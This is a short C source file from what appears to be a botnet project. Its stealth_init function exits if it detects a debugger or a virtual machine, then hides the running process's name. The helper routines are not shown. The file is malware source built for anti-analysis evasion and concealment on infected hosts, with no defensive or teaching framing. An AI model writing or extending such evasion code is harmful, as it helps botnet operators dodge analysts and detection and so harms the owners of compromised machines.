#include "../../include/botnet.h"
#include "../../include/stealth/anti_analysis.h"
#include <stdio.h>
#include <stdlib.h>

// Initializes all stealth modules
void stealth_init(int argc, char *argv[]) {
    // First, check for analysis environments. If found, exit immediately.
    if (check_debugger()) {
        printf("[-] Debugger detected. Exiting.\n");
        exit(0);
    }
    if (check_virtualization()) {
        printf("[-] Virtual machine detected. Exiting.\n");
        exit(0);
    }

    // If not in an analysis environment, hide the process name.
    process_hiding_hide(argc, argv);
}
